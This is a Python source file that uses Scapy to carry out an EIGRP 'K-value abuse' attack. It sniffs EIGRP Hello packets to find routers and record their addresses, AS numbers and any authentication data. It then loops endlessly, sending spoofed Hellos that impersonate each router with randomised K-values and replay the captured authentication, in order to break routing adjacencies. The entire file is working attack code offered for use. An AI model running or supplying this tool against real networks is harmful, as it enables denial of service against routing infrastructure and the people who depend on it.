from scapy.all import *
from scapy.contrib.eigrp import EIGRP, EIGRPParam, EIGRPSwVer, EIGRPAuthData
from colorama import *


def eigrp_k_abusing(interface):
    try:
        print(Fore.YELLOW + f"    [!] Detecting EIGRP routers...")  # Переведено
        eigrp_routers = {}
        global router_count, eigrp_hello_captured, total
        eigrp_hello_captured = False  # Не захвачен
        router_count = 1
        total = 0

        def packet_analyze(packet):
            global router_count, eigrp_hello_captured, auth, auth_type, auth_data, key_id
            if packet.haslayer(EIGRP) and packet[EIGRP].opcode == 5:
                if packet.haslayer(EIGRPAuthData):
                    auth = True
                    auth_type = packet[EIGRPAuthData].authtype
                    auth_data = packet[EIGRPAuthData].authdata
                    key_id = packet[EIGRPAuthData].keyid
                    if auth_type == 2:
                        output_auth = "MD5"
                    elif auth_type == 3:
                        output_auth = "SHA2-256"
                else:
                    auth = False
                    output_auth = "None"

                eigrp_hello_captured = True
                src_mac = packet[Ether].src
                src_ip = packet[IP].src
                asn = packet[EIGRP].asn
                hold_time = packet[EIGRPParam].holdtime

                if src_mac in [router["MAC"] for router in eigrp_routers.values()]:
                    pass
                else:
                    eigrp_routers[f"Router{router_count}"] = {"MAC": src_mac, "IP": src_ip, "AS": asn}
                    router_count += 1
                    print(Fore.GREEN + f"\n    [+] [EIGRP Router detected]\n         MAC: {src_mac.upper()}\n         IP: {src_ip}\n"
                                       f"         AS: {asn}\n         Hold Time: {hold_time}\n         Authentication: {output_auth}")  # Переведено

        sniffer = AsyncSniffer(filter="ip proto 88", iface=interface, prn=packet_analyze, timeout=20)
        sniffer.start()
        time.sleep(21)

        if eigrp_hello_captured == True:
            if auth == False:  # Если аутентификации нет
                print(Fore.GREEN + f"\n    [+] Attack is running... (Press Ctrl + C to Stop)")  # Переведено
                try:
                    while True:
                        for router in eigrp_routers:
                            mac_address = eigrp_routers[router]['MAC']
                            ip_address = eigrp_routers[router]['IP']
                            asn = eigrp_routers[router]['AS']

                            fake_hello_packet = Ether(src=mac_address, dst="01:00:5e:00:00:0a") / \
                                                IP(src=ip_address, dst="224.0.0.10", ttl=1) / \
                                                EIGRP(opcode=5, asn=asn) / \
                                                EIGRPParam(k1=random.randint(0, 1), k2=random.randint(0, 1),
                                                           k3=random.randint(0, 1), k4=random.randint(0, 1),
                                                           k5=random.randint(0, 1)) / \
                                                EIGRPSwVer()
                            sendp(fake_hello_packet, iface=interface, count=1, verbose=False)
                            total += 1
                            print(Fore.GREEN + f"    [+] Sent spoofed EIGRP Hello packets with manipulated K-values: {total}", end="\r")  # Переведено
                        time.sleep(2)

                except KeyboardInterrupt:
                    print(Fore.YELLOW + f"\n\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

            if auth == True:  # Если аутентификация есть
                print(Fore.GREEN + f"\n    [+] Attack is running... (Press Ctrl + C to Stop)")  # Переведено
                try:
                    while True:
                        for router in eigrp_routers:
                            mac_address = eigrp_routers[router]['MAC']
                            ip_address = eigrp_routers[router]['IP']
                            asn = eigrp_routers[router]['AS']

                            fake_hello_packet = Ether(src=mac_address, dst="01:00:5e:00:00:0a") / \
                                                IP(src=ip_address, dst="224.0.0.10", ttl=1) / \
                                                EIGRP(opcode=5, asn=asn) / \
                                                EIGRPAuthData(authtype=auth_type, authdata=auth_data, keyid=key_id) / \
                                                EIGRPParam(k1=random.randint(0, 1), k2=random.randint(0, 1),
                                                           k3=random.randint(0, 1), k4=random.randint(0, 1),
                                                           k5=random.randint(0, 1)) / \
                                                EIGRPSwVer()

                            sendp(fake_hello_packet, iface=interface, count=1, verbose=False)
                            total += 1
                            print(Fore.GREEN + f"    [+] Sent spoofed EIGRP Hello packets with manipulated K-values: {total}", end="\r")  # Переведено
                        time.sleep(2)

                except KeyboardInterrupt:
                    print(Fore.YELLOW + f"\n\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено

        else:
            print(Fore.RED + f"    [-] %ERROR: No EIGRP routers detected (attack aborted)")  # Переведено

    except KeyboardInterrupt:
        print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено